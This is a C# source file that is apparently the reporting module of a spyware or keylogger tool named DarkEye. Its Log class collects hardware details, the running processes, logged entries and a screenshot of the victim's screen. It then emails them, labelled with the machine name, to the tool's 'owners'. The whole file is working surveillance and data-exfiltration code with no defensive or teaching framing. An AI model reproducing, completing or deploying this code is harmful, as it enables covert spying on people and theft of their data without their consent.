using DarkEye.Classes.Managers;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Mail;

namespace DarkEye.Classes.Objects
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class Log
    {
        public Window window;
        public ArrayList processes;
        public ArrayList hardware;
        public ArrayList logs;
        public ArrayList debug;
        public ArrayList content;

        public String status;

        public Log(Window window)
        {
            this.window = window;
            this.processes = new ArrayList();
            this.hardware = new ArrayList();
            this.logs = new ArrayList();
            this.debug = new ArrayList();
            this.content = new ArrayList();

            this.hardware.Add("\n### HARDWARE INFO ###:" + "\n");
            this.logs.Add("\n### LOGS ###:" + "\n");
            this.debug.Add("\n\n### DEBUG ###:" + "\n");

            this.status = this.window == null ? "Connected" : window.name;
            if (this.window == null)
                this.GetHardwareInfo();
        }

        public void GetProcesses()
        {
            this.processes.Clear();
            this.processes.Add("\n### PROCESSES ###:" + "\n");
            foreach (Process process in Process.GetProcesses())
                this.processes.Add(process.ProcessName + ":" + process.Id + "\n");
        }

        public void GetHardwareInfo()
        {
            try
            {
                String[] tables = new string[] { "Win32_ComputerSystem", "Win32_OperatingSystem", "Win32_Processor" };

                for (int i = 0; i < tables.Length; i++)
                {
                    String table = tables[i];
                    this.hardware.Add("# " + table + " {\n");
                    SelectQuery query = new SelectQuery(@"Select * from " + table);
                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                    {
                        foreach (ManagementObject process in searcher.Get())
                        {
                            process.Get();
                            if (i == 0)
                            {
                                this.hardware.Add("  Caption: " + process["Caption"] + "\n");
                                this.hardware.Add("  Description: " + process["Description"] + "\n");
                                this.hardware.Add("  Manufacturer: " + process["Manufacturer"] + "\n");
                                this.hardware.Add("  Model: " + process["Model"] + "\n");
                                this.hardware.Add("  TotalPhysicalMemory: " + process["TotalPhysicalMemory"] + "\n");
                            }
                            if (i == 1)
                            {
                                this.hardware.Add("  Caption: " + process["Caption"] + "\n");
                                this.hardware.Add("  InstallDate: " + process["InstallDate"] + "\n");
                            }
                            if (i == 2)
                            {
                                this.hardware.Add("  Caption: " + process["Caption"] + "\n");
                                this.hardware.Add("  Name: " + process["Name"] + "\n");
                                this.hardware.Add("  DeviceID: " + process["DeviceID"] + "\n");
                                this.hardware.Add("  Description: " + process["Description"] + "\n");
                            }
                        }
                    }
                    this.hardware.Add(" }\n");
                }
            }
            catch (Exception ex)
            {
                Utils.WriteUtils.writeError("GetHardwareInfo: " + ex.Message);
            }
        }

        public void AddContent()
        {
            this.content.Clear();
            this.content.Add("### WINDOW: " + this.window?.name + "\n");

            foreach (String str in this.window == null ? this.hardware : DarkEye.globalLog.hardware)
                this.content.Add(str);

            this.GetProcesses();
            foreach (String str in this.processes)
                this.content.Add(str);

            foreach (String str in this.logs)
                this.content.Add(str);

            foreach (String str in this.window == null ? this.debug : DarkEye.globalLog.debug)
                this.content.Add(str);
        }

        public void AddLog(String log)
        {
            this.logs.Add("[" + log + "], ");
        }

        public void DispathContent()
        {
            try
            {
                this.AddContent();
                String title = DarkEye.DARKEYE_TITLE + " [" + Environment.MachineName + " | " + this.status + "]";
                foreach (Owner owner in DarkEye.ownerManager.owners)
                {
                    String content = "";
                    foreach (String str in this.content)
                        content = content + str;

                    Attachment[] attachments = new Attachment[] { };

                    String screenPath = Path.GetTempPath() + DateTime.Now.ToString("MM.dd.yyyy.HH.mm.ss") + ".jpg";

                    if (Utils.Utils.CaptureScreen(screenPath))
                        attachments = new Attachment[] { new Attachment(screenPath) };
                    new Email(title, content, attachments, owner).Send();
                }
            }
            catch (Exception ex)
            {
                Utils.WriteUtils.writeError("DispathContent: " + ex.Message);
            }
        }
    }
}
